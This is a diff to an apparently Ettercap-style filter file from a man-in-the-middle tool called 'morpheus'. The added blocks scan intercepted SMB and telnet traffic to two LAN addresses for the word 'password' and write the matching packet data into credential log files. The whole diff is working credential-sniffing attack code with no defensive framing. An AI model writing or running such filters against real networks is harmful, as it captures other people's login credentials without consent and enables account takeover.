@@ -77,6 +77,12 @@ if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 443) {
 if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 445) {
   msg("[morpheus] host:192.168.1.67   [ <- ]  port:445 netbios ☠");
   msg("[morpheus] |_status: remote connections to this are suspicious!");
+    # log credentials into morpheus/logs/smb_creds
+    if (regex(DECODED.data, ".*password.*")) {
+      log(DECODED.data, "./smb_creds");
+      msg("[morpheus] | status: login detected!");
+      msg("[morpheus] |_ credentials found, logfile stored ✔\n");
+    }
 }
 if (ip.dst == '192.168.1.67' && ip.proto == UDP && udp.src == 137) {
   msg("[morpheus] host:192.168.1.67   [ -> ]  port:137 netbios ☠");
@@ -87,6 +93,12 @@ if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 139) {
 if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 23) {
   msg("[morpheus] host:192.168.1.67   [ <- ]  port:23 telnet ☠");
   msg("[morpheus] |_status: remote connections to this are suspicious!");
+    # log credentials into morpheus/logs/telnet_creds
+    if (regex(DECODED.data, ".*password.*")) {
+      log(DECODED.data, "./telnet_creds");
+      msg("[morpheus] | status: login detected!");
+      msg("[morpheus] |_ credentials found, logfile stored ✔\n");
+    }
 }
 if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 22) {
   msg("[morpheus] host:192.168.1.67   [ <- ]  port:22 ssh ☆");
@@ -222,6 +234,13 @@ if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 443) {
 }
 if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 445) {
   msg("[morpheus] host:192.168.1.254  [ <- ]  port:445 netbios ☠");
+  msg("[morpheus] |_status: remote connections to this are suspicious!");
+    # log credentials into morpheus/logs/smb_creds
+    if (regex(DECODED.data, ".*password.*")) {
+      log(DECODED.data, "./smb_creds");
+      msg("[morpheus] | status: login detected!");
+      msg("[morpheus] |_ credentials found, logfile stored ✔\n");
+    }
 }
 if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 139) {
   msg("[morpheus] host:192.168.1.254  [ <- ]  port:139 netbios ☠");
@@ -231,6 +250,13 @@ if (ip.dst == '192.168.1.254' && ip.proto == UDP && udp.src == 53) {
 }
 if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 23) {
   msg("[morpheus] host:192.168.1.254  [ <- ]  port:23 telnet ☠");
+  msg("[morpheus] |_status: remote connections to this are suspicious!");
+    # log credentials into morpheus/logs/telnet_creds
+    if (regex(DECODED.data, ".*password.*")) {
+      log(DECODED.data, "./telnet_creds");
+      msg("[morpheus] | status: login detected!");
+      msg("[morpheus] |_ credentials found, logfile stored ✔\n");
+    }
 }
 if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 22) {
   msg("[morpheus] host:192.168.1.254  [ <- ]  port:22 ssh ☆");
